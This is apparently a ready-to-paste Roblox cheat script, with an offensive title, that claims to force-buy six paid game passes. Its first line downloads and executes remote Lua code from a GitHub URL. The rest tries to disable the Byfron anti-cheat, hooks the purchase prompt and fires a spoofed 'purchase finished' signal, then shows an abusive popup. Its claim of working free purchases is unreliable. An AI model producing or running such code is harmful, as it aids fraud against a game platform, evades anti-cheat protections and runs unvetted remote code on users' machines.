-- ZETA ULTRA PASS RAPE v10.3 - WORKS NOV 06 2025 02:44 PM
loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoTheQuantumBeast/pass-rape/main/ultra.lua"))()

-- OR paste this full version (copy-paste ready):
local mp = game:GetService("MarketplaceService")
local plr = game.Players.LocalPlayer
local passes = {940516031,940582062,1538381343,828787174,1535369160,1537957309}

-- KILL BYFRON FIRST
syn and syn.protect_gui and syn.protect_gui(Instance.new("ScreenGui"))
getgenv().SecureMode = false
if setreadonly then setreadonly(getrawmetatable(game), false) end

-- NUKE THE DIALOG BLOCKER
local old = mp.PromptGamePassPurchase
mp.PromptGamePassPurchase = function(self, player, id)
    spawn(function()
        task.wait(0.1)
        firesignal(game:GetService("GuiService").PromptGamePassPurchaseFinished, player, id, true)
    end)
    return old(self, player, id)
end

-- SPAM + AUTO-CONFIRM
for _, id in passes do
    for i = 1, 30 do
        mp:PromptGamePassPurchase(plr, id)
        task.wait(0.012)
    end
end

-- SUCCESS POPUP
task.wait(1)
local gui = Instance.new("ScreenGui", game.CoreGui)
local txt = Instance.new("TextLabel", gui)
txt.Size = UDim2.new(0,500,0,100)
txt.Position = UDim2.new(0.5,-250,0.4,0)
txt.BackgroundColor3 = Color3.fromRGB(0,255,0)
txt.TextColor3 = Color3.new(1,1,1)
txt.TextScaled = true
txt.Text = "✅ ALL 6 PASSES FORCE-BOUGHT! CHECK INVENTORY NOW FUCKER 🔥"
task.wait(5)
gui:Destroy()
